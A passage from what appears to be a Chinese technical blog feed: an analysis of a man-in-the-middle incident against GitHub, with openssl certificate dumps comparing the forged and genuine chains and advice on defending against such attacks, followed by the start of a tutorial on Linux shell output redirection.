class="line">uzcqtTrNERlLIsxDGkLjMAoGCCqGSM49BAMCA0gAMEUCIH1+jEiQTVA+siP2g9kw</span><br><span class="line">ITFZZINVKyET48788OSCLK1hAiEA+c5bJvnrdtZ1rbsLXJWtglkXSeBaHy5Wdt7w</span><br><span class="line">dGc7McM=</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line"> 1 s:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">   i:C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICNzCCAd2gAwIBAgIUD6UJah0ReDrJIuxhqrTa0CAAbAMwCgYIKoZIzj0EAwIw</span><br><span class="line">cTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoGA1UE</span><br><span class="line">CgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcNAQkB</span><br><span class="line">FhAzNDY2MDg0NTNAcXEuY29tMB4XDTE5MDkyNjA5MzIzN1oXDTI5MDkyMzA5MzIz</span><br><span class="line">N1owcTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoG</span><br><span class="line">A1UECgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcN</span><br><span class="line">AQkBFhAzNDY2MDg0NTNAcXEuY29tMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE</span><br><span class="line">qZ26n2ml6hcyf+NS0TP8PSZ1qlFzUb/tpr6Wb6zE9cSzkGOXej0ddI3sNvq/bLzk</span><br><span class="line">LLvaQLEzaIFyRDY6fcSQ36NTMFEwHQYDVR0OBBYEFKv8Ri5sjN4WZoaWvK/h9Yf+</span><br><span class="line">zhVyMB8GA1UdIwQYMBaAFKv8Ri5sjN4WZoaWvK/h9Yf+zhVyMA8GA1UdEwEB/wQF</span><br><span class="line">MAMBAf8wCgYIKoZIzj0EAwIDSAAwRQIhANFUxlZxx3dfmxEu1I0huK9eY/IPl6Xz</span><br><span class="line">AsUXUQZN2QPXAiACddgQK7I4I86sjPwjCMafPES9LkV/whcFV60LlAftaQ==</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">subject=C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = SERVER, emailAddress = 346608453@qq.com</span><br><span class="line"></span><br><span class="line">issuer=C = CN, ST = GD, L = SZ, O = COM, OU = NSP, CN = CA, emailAddress = 346608453@qq.com</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA256</span><br><span class="line">Peer signature <span class="built_in">type</span>: ECDSA</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has <span class="built_in">read</span> 1499 bytes and written 395 bytes</span><br><span class="line">Verification error: self signed certificate <span class="keyword">in</span> certificate chain</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-ECDSA-AES128-GCM-SHA256</span><br><span class="line">Server public key is 256 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-ECDSA-AES128-GCM-SHA256</span><br><span class="line">    Session-ID: 1A4A06D58F5DCC0FA80FFE4125AC12E555126BF8B7C7C627210B9C36F3B5A6ED</span><br><span class="line">    Session-ID-ctx:</span><br><span class="line">    Master-Key: 6BD176466BF93E52D592216063276369497FA26AFF0E7343A872FFA6E3F12BFF611BFDA4F5994F297ECC5772EE812305</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 7a 4c 52 3b d5 f6 1c c4-ea 0d 86 45 37 1a 57 c4   zLR;.......E7.W.</span><br><span class="line">    0010 - a5 47 0e 76 87 9f f1 68-ac 6c 37 e3 02 87 61 77   .G.v...h.l7...aw</span><br><span class="line">    0020 - d9 c5 6a 65 88 3c 44 e5-17 59 5e 30 de 55 51 4a   ..je.&lt;D..Y^0.UQJ</span><br><span class="line">    0030 - f4 9e 51 c9 35 ee ff a9-62 60 a2 7d 63 <span class="built_in">fc</span> c1 f9   ..Q.5...b`.&#125;c...</span><br><span class="line">    0040 - a4 bf 41 c5 2f 42 9a 7c-6d b0 99 49 63 1c 0f 5c   ..A./B.|m..Ic..\</span><br><span class="line">    0050 - 37 ce 32 85 e6 fb 49 5a-01 97 9d 23 6c c6 9e b3   7.2...IZ...<span class="comment">#l...</span></span><br><span class="line">    0060 - 56 dc ae c6 76 cf c6 ba-95 16 c6 c8 57 d1 be c7   V...v.......W...</span><br><span class="line">    0070 - d0 a3 f9 66 c6 4e a9 99-52 60 fe 53 61 9d 15 b1   ...f.N..R`.Sa...</span><br><span class="line">    0080 - d2 1f a0 3c 0c 78 41 af-d8 ac 59 95 9f c9 2f 1c   ...&lt;.xA...Y.../.</span><br><span class="line">    0090 - 07 25 74 3e ae 28 03 1f-1b fd 0d b4 f8 c3 ad 4f   .%t&gt;.(.........O</span><br><span class="line"></span><br><span class="line">    Start Time: 1585268898</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify <span class="built_in">return</span> code: 19 (self signed certificate <span class="keyword">in</span> certificate chain)</span><br><span class="line">    Extended master secret: yes</span><br><span class="line">---</span><br><span class="line">DONE</span><br></pre></td></tr></table></figure></details><h3 id="香港阿里云"><a href="#香港阿里云" class="headerlink" title="香港阿里云"></a>香港阿里云</h3><details>  <summary>点击展开</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openssl s_client -showcerts -connect github.com:443 &lt; /dev/null</span><br><span class="line">CONNECTED(00000005)</span><br><span class="line">depth=2 C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert High Assurance EV Root CA</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=1 C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0 businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = <span class="string">"GitHub, Inc."</span>, CN = github.com</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = <span class="string">"GitHub, Inc."</span>, CN = github.com</span><br><span class="line">   i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIHQjCCBiqgAwIBAgIQCgYwQn9bvO1pVzllk7ZFHzANBgkqhkiG9w0BAQsFADB1</span><br><span class="line">MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3</span><br><span class="line">d3cuZGlnaWNlcnQuY29tMTQwMgYDVQQDEytEaWdpQ2VydCBTSEEyIEV4dGVuZGVk</span><br><span class="line">IFZhbGlkYXRpb24gU2VydmVyIENBMB4XDTE4MDUwODAwMDAwMFoXDTIwMDYwMzEy</span><br><span class="line">MDAwMFowgccxHTAbBgNVBA8MFFByaXZhdGUgT3JnYW5pemF0aW9uMRMwEQYLKwYB</span><br><span class="line">BAGCNzwCAQMTAlVTMRkwFwYLKwYBBAGCNzwCAQITCERlbGF3YXJlMRAwDgYDVQQF</span><br><span class="line">Ewc1MTU3NTUwMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQG</span><br><span class="line">A1UEBxMNU2FuIEZyYW5jaXNjbzEVMBMGA1UEChMMR2l0SHViLCBJbmMuMRMwEQYD</span><br><span class="line">VQQDEwpnaXRodWIuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA</span><br><span class="line">xjyq8jyXDDrBTyitcnB90865tWBzpHSbindG/XqYQkzFMBlXmqkzC+FdTRBYyneZ</span><br><span class="line">w5Pz+XWQvL+74JW6LsWNc2EF0xCEqLOJuC9zjPAqbr7uroNLghGxYf13YdqbG5oj</span><br><span class="line">/4x+ogEG3dF/U5YIwVr658DKyESMV6eoYV9mDVfTuJastkqcwero+5ZAKfYVMLUE</span><br><span class="line">sMwFtoTDJFmVf6JlkOWwsxp1WcQ/MRQK1cyqOoUFUgYylgdh3yeCDPeF22Ax8AlQ</span><br><span class="line">xbcaI+GwfQL1FB7Jy+h+KjME9lE/UpgV6Qt2R1xNSmvFCBWu+NFX6epwFP/JRbkM</span><br><span class="line">fLz0beYFUvmMgLtwVpEPSwIDAQABo4IDeTCCA3UwHwYDVR0jBBgwFoAUPdNQpdag</span><br><span class="line">re7zSmAKZdMh1Pj41g8wHQYDVR0OBBYEFMnCU2FmnV+rJfQmzQ84mqhJ6kipMCUG</span><br><span class="line">A1UdEQQeMByCCmdpdGh1Yi5jb22CDnd3dy5naXRodWIuY29tMA4GA1UdDwEB/wQE</span><br><span class="line">AwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwdQYDVR0fBG4wbDA0</span><br><span class="line">oDKgMIYuaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItZXYtc2VydmVyLWcy</span><br><span class="line">LmNybDA0oDKgMIYuaHR0cDovL2NybDQuZGlnaWNlcnQuY29tL3NoYTItZXYtc2Vy</span><br><span class="line">dmVyLWcyLmNybDBLBgNVHSAERDBCMDcGCWCGSAGG/WwCATAqMCgGCCsGAQUFBwIB</span><br><span class="line">FhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BTMAcGBWeBDAEBMIGIBggrBgEF</span><br><span class="line">BQcBAQR8MHowJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBS</span><br><span class="line">BggrBgEFBQcwAoZGaHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0</span><br><span class="line">U0hBMkV4dGVuZGVkVmFsaWRhdGlvblNlcnZlckNBLmNydDAMBgNVHRMBAf8EAjAA</span><br><span class="line">MIIBfgYKKwYBBAHWeQIEAgSCAW4EggFqAWgAdgCkuQmQtBhYFIe7E6LMZ3AKPDWY</span><br><span class="line">BPkb37jjd80OyA3cEAAAAWNBYm0KAAAEAwBHMEUCIQDRZp38cTWsWH2GdBpe/uPT</span><br><span class="line">Wnsu/m4BEC2+dIcvSykZYgIgCP5gGv6yzaazxBK2NwGdmmyuEFNSg2pARbMJlUFg</span><br><span class="line">U5UAdgBWFAaaL9fC7NP14b1Esj7HRna5vJkRXMDvlJhV1onQ3QAAAWNBYm0tAAAE</span><br><span class="line">AwBHMEUCIQCi7omUvYLm0b2LobtEeRAYnlIo7n6JxbYdrtYdmPUWJQIgVgw1AZ51</span><br><span class="line">vK9ENinBg22FPxb82TvNDO05T17hxXRC2IYAdgC72d+8H4pxtZOUI5eqkntHOFeV</span><br><span class="line">CqtS6BqQlmQ2jh7RhQAAAWNBYm3fAAAEAwBHMEUCIQChzdTKUU2N+XcqcK0OJYrN</span><br><span class="line">8EYynloVxho4yPk6Dq3EPgIgdNH5u8rC3UcslQV4B9o0a0w204omDREGKTVuEpxG</span><br><span class="line">eOQwDQYJKoZIhvcNAQELBQADggEBAHAPWpanWOW/ip2oJ5grAH8mqQfaunuCVE+v</span><br><span class="line">ac+88lkDK/LVdFgl2B6kIHZiYClzKtfczG93hWvKbST4NRNHP9LiaQqdNC17e5vN</span><br><span class="line">HnXVUGw+yxyjMLGqkgepOnZ2Rb14kcTOGp4i5AuJuuaMwXmCo7jUwPwfLe1NUlVB</span><br><span class="line">Kqg6LK0Hcq4K0sZnxE8HFxiZ92WpV2AVWjRMEc/2z2shNoDvxvFUYyY1Oe67xINk</span><br><span class="line">myQKc+ygSBZzyLnXSFVWmHr3u5dcaaQGGAR42v6Ydr4iL38Hd4dOiBma+FXsXBIq</span><br><span class="line">WUjbST4VXmdaol7uzFMojA4zkxQDZAvF5XgJlAFadfySna/teik=</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line"> 1 s:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA</span><br><span class="line">   i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert High Assurance EV Root CA</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIEtjCCA56gAwIBAgIQDHmpRLCMEZUgkmFf4msdgzANBgkqhkiG9w0BAQsFADBs</span><br><span class="line">MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3</span><br><span class="line">d3cuZGlnaWNlcnQuY29tMSswKQYDVQQDEyJEaWdpQ2VydCBIaWdoIEFzc3VyYW5j</span><br><span class="line">ZSBFViBSb290IENBMB4XDTEzMTAyMjEyMDAwMFoXDTI4MTAyMjEyMDAwMFowdTEL</span><br><span class="line">MAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3</span><br><span class="line">LmRpZ2ljZXJ0LmNvbTE0MDIGA1UEAxMrRGlnaUNlcnQgU0hBMiBFeHRlbmRlZCBW</span><br><span class="line">YWxpZGF0aW9uIFNlcnZlciBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC</span><br><span class="line">ggEBANdTpARR+JmmFkhLZyeqk0nQOe0MsLAAh/FnKIaFjI5j2ryxQDji0/XspQUY</span><br><span class="line">uD0+xZkXMuwYjPrxDKZkIYXLBxA0sFKIKx9om9KxjxKws9LniB8f7zh3VFNfgHk/</span><br><span class="line">LhqqqB5LKw2rt2O5Nbd9FLxZS99RStKh4gzikIKHaq7q12TWmFXo/a8aUGxUvBHy</span><br><span class="line">/Urynbt/DvTVvo4WiRJV2MBxNO723C3sxIclho3YIeSwTQyJ3DkmF93215SF2AQh</span><br><span class="line">cJ1vb/9cuhnhRctWVyh+HA1BV6q3uCe7seT6Ku8hI3UarS2bhjWMnHe1c63YlC3k</span><br><span class="line">8wyd7sFOYn4XwHGeLN7x+RAoGTMCAwEAAaOCAUkwggFFMBIGA1UdEwEB/wQIMAYB</span><br><span class="line">Af8CAQAwDgYDVR0PAQH/BAQDAgGGMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEF</span><br><span class="line">BQcDAjA0BggrBgEFBQcBAQQoMCYwJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRp</span><br><span class="line">Z2ljZXJ0LmNvbTBLBgNVHR8ERDBCMECgPqA8hjpodHRwOi8vY3JsNC5kaWdpY2Vy</span><br><span class="line">dC5jb20vRGlnaUNlcnRIaWdoQXNzdXJhbmNlRVZSb290Q0EuY3JsMD0GA1UdIAQ2</span><br><span class="line">MDQwMgYEVR0gADAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5j</span><br><span class="line">b20vQ1BTMB0GA1UdDgQWBBQ901Cl1qCt7vNKYApl0yHU+PjWDzAfBgNVHSMEGDAW</span><br><span class="line">gBSxPsNpA/i/RwHUmCYaCALvY2QrwzANBgkqhkiG9w0BAQsFAAOCAQEAnbbQkIbh</span><br><span class="line">hgLtxaDwNBx0wY12zIYKqPBKikLWP8ipTa18CK3mtlC4ohpNiAexKSHc59rGPCHg</span><br><span class="line">4xFJcKx6HQGkyhE6V6t9VypAdP3THYUYUN9XR3WhfVUgLkc3UHKMf4Ib0mKPLQNa</span><br><span class="line">2sPIoc4sUqIAY+tzunHISScjl2SFnjgOrWNoPLpSgVh5oywM395t6zHyuqB8bPEs</span><br><span class="line">1OG9d4Q3A84ytciagRpKkk47RpqF/oOi+Z6Mo8wNXrM9zwR4jxQUezKcxwCmXMS1</span><br><span class="line">oVWNWlZopCJwqjyBcdmdqEU79OX2olHdx3ti6G8MdOu42vi/hw15UJGQmxg7kVkn</span><br><span class="line">8TUoE6smftX3eg==</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">subject=businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = <span class="string">"GitHub, Inc."</span>, CN = github.com</span><br><span class="line"></span><br><span class="line">issuer=C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA256</span><br><span class="line">Peer signature <span class="built_in">type</span>: RSA-PSS</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has <span class="built_in">read</span> 3621 bytes and written 376 bytes</span><br><span class="line">Verification: OK</span><br><span class="line">---</span><br><span class="line">New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256</span><br><span class="line">Server public key is 2048 bit</span><br><span class="line">Secure Renegotiation IS NOT supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">Early data was not sent</span><br><span class="line">Verify <span class="built_in">return</span> code: 0 (ok)</span><br><span class="line">---</span><br><span class="line">DONE</span><br></pre></td></tr></table></figure></details><h2 id="实施手段"><a href="#实施手段" class="headerlink" title="实施手段"></a>实施手段</h2><p>通过检查网络和对出现的状况的分析，我认为这次MITM不是通过sni或者返回的证书进行的，而是直接针对某些ip的443端口进行的</p><p>通过控制这些ip的路由，让流量经过某些恶意节点，在某个恶意节点针对443端口进行MITM，而不检查实际访问的域名和返回的证书</p><p>并且这次事件所影响的github的ip并不全，通过doh或dot获取到国外服务器解析到的ip而不是国内使用的几个ip，可以正常访问github</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>使用TLS是保证我们访问网站时信息不被中间人窥探和篡改的有效手段，如果TLS用来加密通讯使用的证书出现问题，那么信息安全就无从谈起</p><p>TLS使用公钥密码算法交换后面数据进行对称加密使用的秘钥，作为中间人没有服务器上的私钥就无法解密获得后面加密使用的秘钥，所以即使截获到https的数据报文，也无法解密和篡改传输的内容</p><p>而本次事件使用的手法是MITM常用手法，通常情况下我们为了抓包和改包，会自己签署一个假的证书并导入自己被抓包设备的信任证书列表，然后中间人分别与服务器和客户端建立TLS连接，简单来说，中间人作为客户端从服务器获取内容，然后作为服务器向真正的客户端传输修改后的内容</p><p>所以如果我们信任了浏览器给出的警告，就会导致我们的信息包括github用户名、邮箱、密码、token和私有库泄露</p><h2 id="如何防范"><a href="#如何防范" class="headerlink" title="如何防范"></a>如何防范</h2><p>作为站长，首先可以确定的是，并没有什么用户无痛(无需用户进行任何操作和设置)的办法来绕过这类针对性的MITM攻击，如果需要保护用户的隐私，建议开启域名的HSTS策略，这样浏览器检查到证书错误时的警告页面上就不会显示 <code>忽略警告</code> 相关按钮，防止不懂的用户忽略安全警告进行访问，避免隐私数据泄露</p><p>当然，像昨天那种针对 Github Pages 的攻击只会导致用户无法访问，并不会带来隐私泄露，因为github pages是提供静态网页托管，根本不需要用户输入隐私数据</p><p>作为访客，因为这种中间人攻击肯定发生在路由路径的某一个节点处，所以我们可以使用代理绕过这个恶意节点，这应该是目前最简单最好用的方法了</p><p>同时，当我们在浏览器中发现此类警告，除非是对证书内容充分信任(如自己为了调试而签发的证书)，否则不要忽视任何此类的警告而强行访问，否则隐私信息泄露在所难免</p><blockquote><p>因为我自己访问国外网站一直是使用代理，所以本次事件对我的影响几乎等于零<br>因为不受影响，所以也很难在第一时间发现这类事件，后续需要准备一个监控系统了</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> MITM </tag>
            
            <tag> https </tag>
            
            <tag> hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Shell中的重定向</title>
      <link href="/2020/redirect-in-shell.html"/>
      <url>/2020/redirect-in-shell.html</url>
      
        <content type="html"><![CDATA[<p>经常会看到别人的shell脚本后面有一个 <code>2&gt;&amp;1</code> ，一直没去深究，今天这个话题就以这个为出发点进行展开，学习一下linux shell中重定向的话题。</p><h2 id="特殊的东西"><a href="#特殊的东西" class="headerlink" title="特殊的东西"></a>特殊的东西</h2><p>先来看一点linux中特殊的东西，为后面的内容打下基础</p><h3 id="特殊的文件"><a href="#特殊的文件" class="headerlink" title="特殊的文件"></a>特殊的文件</h3><ul><li><code>/dev/null</code> 空，可以将垃圾内容导入其中，就会消失</li><li><code>/dev/zero</code> 零，可以从中读出无穷无尽的0</li><li><code>/dev/urandom</code> 随机数，可以从中读出无穷无尽的随机数</li><li><code>/dev/stdin</code> 标准输入流</li><li><code>/dev/stdout</code> 标准输出流</li><li><code>/dev/stderr</code> 标准错误输出流</li></ul><p>我们可以看到后三个文件其实是个链接，指向内核的文件描述符 0\1\2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root         15 Mar 24 16:20 stderr -&gt; /proc/self/fd/2</span><br><span class="line">lrwxrwxrwx 1 root root         15 Mar 24 16:20 stdin -&gt; /proc/self/fd/0</span><br><span class="line">lrwxrwxrwx 1 root root         15 Mar 24 16:20 stdout -&gt; /proc/self/fd/1</span><br></pre></td></tr></table></figure><h3 id="特殊的文件描述符"><a href="#特殊的文件描述符" class="headerlink" title="特殊的文件描述符"></a>特殊的文件描述符</h3><p>在Linux shell中有三个特殊的文件描述符（<code>File descriptor</code> or <code>fd</code>）:</p><ul><li>fd<code>0</code> 是标准输入: <code>stdin</code></li><li>fd<code>1</code> 是标准输出: <code>stdout</code></li><li>fd<code>2</code> 是标准错误输出: <code>stderr</code></li></ul><p>通过这三个特殊的文件描述符我们可以控制输入输出流</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>我们经常会接触到 <code>&gt;</code> 这个符号，叫做重定向，其实还有另一个符号 <code>&gt;&gt;</code> 有着类似的功能，他们之间有一点小区别：</p><ul><li><code>&gt;</code> 是覆盖的方式</li><li><code>&gt;&gt;</code> 是追加的方式</li></ul><blockquote><p>下面的内容将全部以 <code>&gt;</code> 为例，<code>&gt;&gt;</code> 除了内容是追加之外没有其他区别，就不赘述</p></blockquote><h2 id="使用重定向"><a href="#使用重定向" class="headerlink" title="使用重定向"></a>使用重定向</h2><h3 id="重定向到文件"><a href="#重定向到文件" class="headerlink" title="重定向到文件"></a>重定向到文件</h3><p>先来看一下最基本的重定向的使用方法，我们将 <code>echo</code> 命令的输出重定向到一个文件中</p><p><code>echo &quot;hello&quot; &gt; a.txt</code></p><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># echo "hello" &gt; a.txt</span></span><br><span class="line">root@ubuntu:~<span class="comment"># cat a.txt</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>这里是将 <strong>stdout</strong> 重定向到文件 <strong>a.txt</strong> 中，与下面的命令等价</p><p><code>echo &quot;hello&quot; 1&gt; a.txt</code></p><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># rm a.txt</span></span><br><span class="line">root@ubuntu:~<span class="comment"># echo "hello" 1&gt; a.txt</span></span><br><span class="line">root@ubuntu:~<span class="comment"># cat a.txt</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>这里我们看到重定向符号 <code>&gt;</code> 默认是将 <code>stdout</code> 也就是 fd<code>1</code> 重定向到别处</p><p>如果我们想要将标准错误输出<code>stderr</code>进行重定向，只需要将上面命令中的文件描述符<code>1</code>修改为标准错误输出的文件描述符<code>2</code>即可</p><h3 id="重定向到文件描述符"><a href="#重定向到文件描述符" class="headerlink" title="重定向到文件描述符"></a>重定向到文件描述符</h3><p>有些情况下 <code>stderr</code> 是会被程序控制写入错误日志的，如果我们想要在命令运行的时候将错误显示在屏幕上，就需要将错误输出重定向到标准输出流中</p><p>我们先来尝试一下, 这里我们没有找到一个合适的命令，就拿 <code>ls</code> 命令查看一个不存在的目录，这样会产生错误输出</p><blockquote><p>这里错误默认是会被输出到屏幕的，只是我暂时没有找到一个更好的程序，我们先假设他不会输出到屏幕</p></blockquote><p><code>ls error 2&gt;1</code></p><p>这里我们的猜想是将 <code>stderr</code> 重定向到 <code>stdout</code>, 所以写了 <code>2&gt;1</code>, 我们来看一下会不会成功？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls error 2&gt;1</span></span><br><span class="line">root@ubuntu:~<span class="comment">#</span></span><br><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">1</span><br><span class="line">root@ubuntu:~<span class="comment"># cat 1</span></span><br><span class="line">ls: cannot access <span class="string">'error'</span>: No such file or directory</span><br></pre></td></tr></table></figure><p>我们看到了，并没有输出，而是在当前目录下生成了一个文件 <code>1</code>, 这说明如果我们只写 <code>&gt;1</code> 会被当做重定向到文件 <code>1</code> 中</p><p>此时，我们的 <code>&amp;</code> 就要上场了</p><p><code>&gt;&amp;</code> 是将一个流重定向到一个文件描述符的语法，所以刚刚我们应该指明要重定向到 fd<code>1</code>, 也就是 <code>&amp;1</code></p><p><code>ls error 2&gt;&amp;1</code></p><p>执行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls error 2&gt;&amp;1</span></span><br><span class="line">ls: cannot access <span class="string">'error'</span>: No such file or directory</span><br></pre></td></tr></table></figure><blockquote><p>到这里我们就可以自主发挥了</p></blockquote><p>将标准输出重定向到标准错误输出</p><p><code>echo &quot;hello&quot; 1&gt;&amp;2</code> or <code>echo &quot;hello&quot; &gt;&amp;2</code></p><p>甚至我们可以玩点复杂的</p><p><code>(echo &quot;hello&quot; &gt;&amp;9) 9&gt;&amp;2 2&gt;&amp;1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 